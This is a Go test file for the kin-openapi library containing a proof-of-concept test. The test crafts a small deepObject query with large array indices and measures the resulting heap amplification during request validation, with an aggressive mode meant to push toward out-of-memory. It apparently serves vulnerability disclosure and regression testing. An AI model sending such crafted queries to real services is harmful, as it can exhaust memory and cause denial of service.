package openapi3filter_test

import (
	"context"
	"fmt"
	"net/http"
	"os"
	"runtime"
	"strings"
	"testing"

	"github.com/getkin/kin-openapi/openapi3"
	"github.com/getkin/kin-openapi/openapi3filter"
	"github.com/getkin/kin-openapi/routers/gorillamux"
)

const specDeepObjectAddPropsArrays = `
openapi: 3.1.0
info: {title: PoC, version: 1.0.0}
paths:
  /f:
    get:
      parameters:
        - name: filter
          in: query
          style: deepObject
          explode: true
          schema:
            type: object
            additionalProperties:
              type: array
              items: {type: string}
      responses:
        '200': {description: ok}
`

// TestPoCDeepObjectMemoryAmplification shows that a tiny query drives
// disproportionate heap allocation (no aggregate bound across arrays).
// Default magnitude is deliberately modest; set POC_AGGRESSIVE=1 to push
// toward OOM.
func TestPoCDeepObjectMemoryAmplification(t *testing.T) {
	N, idx := 12, 2000 // TUNE so default stays < ~300 MB
	if os.Getenv("POC_AGGRESSIVE") != "" {
		N, idx = 1000, 10000
	}

	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(specDeepObjectAddPropsArrays))
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	if err := doc.Validate(loader.Context); err != nil {
		t.Fatalf("validate: %v", err)
	}
	router, err := gorillamux.NewRouter(doc)
	if err != nil {
		t.Fatalf("router: %v", err)
	}

	var sb strings.Builder
	sb.WriteString("/f?")
	for i := 0; i < N; i++ {
		if i > 0 {
			sb.WriteByte('&')
		}
		fmt.Fprintf(&sb, "filter[k%d][%d]=x", i, idx)
	}
	target := sb.String()

	req, _ := http.NewRequest(http.MethodGet, target, nil)
	route, pathParams, err := router.FindRoute(req)
	if err != nil {
		t.Fatalf("route: %v", err)
	}

	var m0, m1 runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&m0)
	_ = openapi3filter.ValidateRequest(context.Background(), &openapi3filter.RequestValidationInput{
		Request: req, PathParams: pathParams, Route: route,
		Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
	})
	runtime.ReadMemStats(&m1)

	allocated := m1.TotalAlloc - m0.TotalAlloc
	ratio := float64(allocated) / float64(len(target))
	t.Logf("query=%d bytes (N=%d idx=%d) -> allocated ≈ %d bytes (%.1f MB), amplification ≈ %.0fx",
		len(target), N, idx, allocated, float64(allocated)/(1024*1024), ratio)
	if ratio > 1000 {
		t.Fatalf("VULNERABLE: %d-byte query allocated %.1f MB (≈%.0fx amplification); scales to OOM",
			len(target), float64(allocated)/(1024*1024), ratio)
	}
}
